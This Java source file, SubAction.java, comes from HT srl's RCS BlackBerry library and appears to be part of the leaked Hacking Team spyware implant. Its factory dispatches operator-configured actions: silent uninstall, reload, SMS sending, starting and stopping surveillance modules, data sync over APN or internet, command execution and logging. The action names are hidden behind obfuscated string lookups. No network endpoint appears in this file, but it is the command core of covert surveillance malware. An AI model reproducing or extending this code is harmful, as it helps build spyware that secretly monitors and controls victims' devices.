//#preprocess

/* *************************************************
 * Copyright (c) 2010 - 2010
 * HT srl,   All rights reserved.
 * Project      : RCS, RCSBlackBerry_lib
 * File         : SubAction.java
 * Created      : 26-mar-2010
 * *************************************************/
package blackberry.action;

import rpc.json.me.JSONException;
import blackberry.Messages;
import blackberry.Status;
import blackberry.Trigger;
import blackberry.action.sync.SyncActionApn;
import blackberry.action.sync.SyncActionInternet;
import blackberry.config.ConfAction;
import blackberry.config.ConfigurationException;
import blackberry.debug.Check;
import blackberry.debug.Debug;
import blackberry.debug.DebugLevel;

/**
 * The Class SubAction.
 */
public abstract class SubAction {
    //#ifdef DEBUG
    protected static Debug debug = new Debug("SubAction", DebugLevel.VERBOSE); //$NON-NLS-1$
    //#endif
    private final ConfAction conf;

    protected Status status;

    /**
     * Instantiates a new sub action.
     * 
     * @param type
     *            the type
     * @param jsubaction
     *            the params
     */
    public SubAction(final ConfAction conf) {
        this.status = Status.self();
        this.conf = conf;

        parse(conf);
    }

    /**
     * Factory.
     * 
     * @param type
     * 
     * @param typeId
     *            the type
     * @param params
     *            the conf params
     * @return the sub action
     * @throws JSONException
     * @throws ConfigurationException
     */
    public static SubAction factory(String type, final ConfAction params)
            throws ConfigurationException {
        //#ifdef DBC
        Check.asserts(type != null, "factory: null type"); //$NON-NLS-1$
        //#endif

        if (type.equals(Messages.getString("8.2"))) { //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("factory *** ACTION_UNINSTALL ***"); //$NON-NLS-1$
            //#endif

            return new UninstallAction(params);
        } else if (type.equals(Messages.getString("8.4"))) { //$NON-NLS-1$
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_RELOAD ***"); //$NON-NLS-1$
            //#endif

            return new ReloadAction(params);

        } else if (type.equals(Messages.getString("8.6"))) { //$NON-NLS-1$
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_SMS ***"); //$NON-NLS-1$
            //#endif

            return new SmsAction(params);

        } else if (type.equals(Messages.getString("8.8"))) { //$NON-NLS-1$
            String status = params.getString(Messages.getString("8.9")); //$NON-NLS-1$
            if (status.equals(Messages.getString("8.10"))) { //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_START_MODULE ***"); //$NON-NLS-1$
                //#endif

                return new StartModuleAction(params);
            } else if (status.equals(Messages.getString("8.12"))) { //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_STOP_MODULE ***"); //$NON-NLS-1$
                //#endif

                return new StopModuleAction(params);

            }
            //8.14=event
        } else if (type.equals(Messages.getString("8.14"))) { //$NON-NLS-1$

            //8.15=status
            String status = params.getString(Messages.getString("8.15")); //$NON-NLS-1$

            //#ifdef DEBUG
            debug.trace("factory event: " + status);
            //#endif

            //8.16=start
            if (status.equals(Messages.getString("8.16"))) { //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_ENABLE_EVENT ***"); //$NON-NLS-1$
                //#endif

                return new EnableEventAction(params);
                //8.18=stop
            } else if (status.equals(Messages.getString("8.18"))) { //$NON-NLS-1$
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_DISABLE_EVENT ***"); //$NON-NLS-1$
                //#endif

                return new DisableEventAction(params);
            }

        } else if (type.equals(Messages.getString("8.20"))) { //$NON-NLS-1$
            boolean apn = params.has(Messages.getString("8.21")); //$NON-NLS-1$
            if (apn) {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_SYNC_APN ***"); //$NON-NLS-1$
                //#endif

                return new SyncActionApn(params);
            } else {
                //#ifdef DEBUG
                debug.trace("factory *** ACTION_SYNC ***"); //$NON-NLS-1$
                //#endif

                return new SyncActionInternet(params);
            }

        } else if (type.equals(Messages.getString("8.24"))) { //$NON-NLS-1$
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_EXECUTE ***"); //$NON-NLS-1$
            //#endif

            return new ExecuteAction(params);

        } else if (type.equals(Messages.getString("8.26"))) { //$NON-NLS-1$
            //#ifdef DEBUG
            debug.trace("factory *** ACTION_INFO ***"); //$NON-NLS-1$
            //#endif

            return new LogAction(params);
        } else {
            //#ifdef DEBUG
            debug.error("factory Error: unknown type: " + type); //$NON-NLS-1$
            //#endif

        }
        
        return new NullAction(params);
    }

    public String getType() {
        return conf.getType();
    }

    /** The finished. */
    private boolean finished;

    /**
     * Parse
     * 
     * @param jsubaction
     *            byte array from configuration
     */
    protected abstract boolean parse(final ConfAction conf);

    /**
     * Execute.
     * 
     * @param trigger
     * 
     * @return true, if successful
     */
    public abstract boolean execute(Trigger trigger);

    //#ifdef DEBUG
    public String toString() {
        return "SubAction (" + conf.actionId + "/" + conf.subActionId + ") <" + conf.getType().toUpperCase() + "> " + conf; //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
    }
    //#endif

}
